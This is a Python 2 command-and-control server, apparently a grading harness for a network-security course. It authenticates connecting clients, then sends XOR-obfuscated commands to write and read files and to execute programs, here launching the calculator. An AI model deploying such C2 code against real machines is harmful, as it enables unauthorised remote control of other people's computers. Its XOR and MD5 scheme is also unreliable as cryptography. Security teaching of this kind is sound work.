#!/usr/bin/python
#encoding=utf-8

import socket
import struct
import time
import threading
import sys
import os
import re
import hashlib
import random
from Queue import *

def sendDataUnit(sock,content):
	length = struct.pack("!i",len(content))
	try:
		sock.send(length+content)
	except:
		print "[sendDataUnit] send data fail"
		return 1
	return 0

def recvDataUnit(sock):
	try:
		tmp =  sock.recv(4)
	except:
		print "[recvDataUnit] recv data fail"
		return None
	length = struct.unpack("!i",tmp)[0]
	content = ""
	while length>0 :
		content += sock.recv(1)
		length -= 1
	return content

def recvEncryptDataUnit(sock,key):
	content = recvDataUnit(sock)
	tmpstr=""
	for i in range(0,len(content)):
		tmpstr += chr(ord(content[i])^ord(key[i%len(key)]))
	return tmpstr 

def sendEncryptDataUnit(sock,content,key):
	tmpstr = ""
	for i in range(0,len(content)):
		tmpstr += chr(ord(content[i])^ord(key[i%len(key)]))
	return sendDataUnit(sock,tmpstr)

def getFile(sock,key):
	du = recvEncryptDataUnit(sock,key)
	print "[getFile] getFile file length",len(du)
	print "[getFile] done"
	return du

def writeFile(sock,fileContent,key):
	print "[writeFile] ",fileContent
	sendEncryptDataUnit(sock,fileContent,key)

def commandWriteFile(connectSocket,fileContent,dstfile,key):
	command = " ".join(["/download",dstfile])
	sendEncryptDataUnit(connectSocket,command,key)
	print "[commandWriteFile] bytes",len(command)
	writeFile(connectSocket,fileContent,key)

def commandExec(connectSocket,execCmd,key):
	print "[commandExec] command ",execCmd,"executes"
	command = " ".join(["/exec",execCmd])
	sendEncryptDataUnit(connectSocket,command,key)

def commandCheckAlive(connectSocket,key):
	ctime = str(time.time())
	command = " ".join(["/checkAlive",ctime])
	sendEncryptDataUnit(connectSocket,command,key)
	content = recvEncryptDataUnit(connectSocket,key)
	print "[checkAlive] done"
	return 0

def commandReadFile(connectSocket,filename,key):
	sendEncryptDataUnit(connectSocket,"/readFile "+filename,key)
	msg = getFile(connectSocket,key)
	print "[commandReadFile]",msg
	return msg

class clientSocket(threading.Thread):
	def __init__(self,socket,clientList):
		threading.Thread.__init__(self)
		self.clientList=clientList
		self.clientList.append(self)
		self.connectSock = socket
		self.stat = "auth"
		self.MsgQ = Queue()
		self.time = time.time()
		self.sessionKey = self.genRandID()

	def genRandID(self):
		sessionKey = hashlib.md5( str(random.random())).hexdigest()
		return sessionKey

	def authentication(self):
		print "[authentication] start authentication"
		res =  recvDataUnit( self.connectSock )
		if not res.strip() == "/hello":
			print "[authentication] Fail when hello"
			return 0
		sendDataUnit( self.connectSock , "/hello OK" )
		res =  recvDataUnit( self.connectSock )
		if not res.startswith("/sendIP"):
			print "[authentication] Fail when getIP"
			return 0
		sendDataUnit( self.connectSock , "/fin " + self.sessionKey )
		self.stat = "c&c"
		return 1

	def enqueue(self,msg):
		self.MsgQ.put(msg)

	def disconnect(self):
		self.connectSock.close()
		self.clientList.remove(self)

	def run(self):
		if not self.authentication():
			print "[Client Thread] Authentication Fail, disconnect"
			return
		time.sleep(3)
		challenge = str(random.random())
		targetFile = "challenge.txt"
		commandWriteFile(self.connectSock,challenge,targetFile,self.sessionKey)
		response = commandReadFile(self.connectSock,targetFile,self.sessionKey)
		print "[checkResponse] ",challenge,response
		targetFile = "result.txt"
		if challenge == response:
			commandWriteFile(self.connectSock,"correct",targetFile,self.sessionKey)
		else :
			msg = "Incorrect\n"
			msg += "Expect "+challenge+"\n"
			msg += "Receive "+response+"\n"
			commandWriteFile(self.connectSock,msg,targetFile,self.sessionKey)
		commandExec(self.connectSock,"cmd.exe /c calc", self.sessionKey)
		commandCheckAlive(self.connectSock, self.sessionKey)
		self.disconnect()

if __name__ == "__main__":
	if len(sys.argv) != 2:
		print "Usage: %s <port>" % (sys.argv[0])
		sys.exit(1)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
	host = ''
	key = "netsecIsSoCool"
	port = int(sys.argv[1])
	s.bind((host, port)) 

	s.listen(10) 
	clientList = []

	while True:
		CsockIns = clientSocket(s.accept()[0],clientList)
		CsockIns.start()

